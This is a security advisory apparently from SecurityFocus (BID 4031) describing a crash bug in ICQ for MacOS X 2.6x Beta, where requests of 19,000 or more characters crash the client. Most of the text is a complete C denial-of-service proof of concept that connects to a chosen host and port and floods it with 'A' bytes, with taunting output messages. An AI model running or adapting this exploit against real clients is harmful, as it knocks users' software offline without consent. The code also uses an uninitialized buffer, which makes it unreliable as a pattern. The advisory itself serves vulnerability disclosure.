source: http://www.securityfocus.com/bid/4031/info

ICQ For MacOS X is a port of the popular Mirabilis ICQ client to the Apple MacOS X platform. It is freely available.

It is possible to cause MacOS X ICQ clients to crash by sending an excessively long request (19000+ characters). MacOS X ICQ clients normally bind to ports 49152 and 49159.

This is likely due to an unchecked buffer of some sort, so the possibility of exploiting this condition to execute arbitrary attacker-supplied instructions does exist. Though this possibility has not been confirmed.

This issue has been reported for ICQ For MacOS X version 2.6X Beta. Other versions may also be prone to this issue. 

/*
 * OSX ICQ Dos. sa7ori@tasam.com
 * Proof of concept. Worked on early versions of Licq. Now it apparently works
 * for various versions of OSX ICQ clients.
 * Tested and works on: ICQ MacOSX Ver 2.6x Beta Build 7
 * and several others.
 */

#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main(int argc, char **argv){
  char buf[19000]; int i, sock, result; struct sockaddr_in sin; struct hostent *gothost;
  printf("So you wanna DoS ICQ...\n sa7ori@tasam.com\nBRAAAAAZIIIIIIIL\n");
  if (argc < 3) {
      fprintf(stderr, "Usage: %s <icqclient> <port>\njeez. get it right.\n", argv[0]);
      exit(-1);
    }
  gothost = gethostbyname(argv[1]);
  if (!gothost){
      fprintf(stderr, "%s: Host resolv failed. Tard.\n", argv[1]);
      exit(-1);
    }
  sin.sin_family = AF_INET; sin.sin_port = htons(atoi(argv[2]));
  sin.sin_addr = *(struct in_addr *)gothost->h_addr; sock = socket(AF_INET, SOCK_STREAM, 0);
  result = connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
  if (result != 0) {
      fprintf(stderr, "Connect Failed. reTard. %s\n", argv[1]);
      exit(-1);
    }
  if (sock < 0){
      fprintf(stderr, "Error in socket.");
      exit(-1);
    }
  for (i=0; i<19000; i++) /* send loop shaboing boing boing */
    strncat(buf, "A", 1);
  send(sock, buf, sizeof(buf), 0);
  close(sock);
  fprintf(stdout, "ShinryuHadoken\n..And an angry flurry of As flies from your outstreached hand. heh.\n\n");
}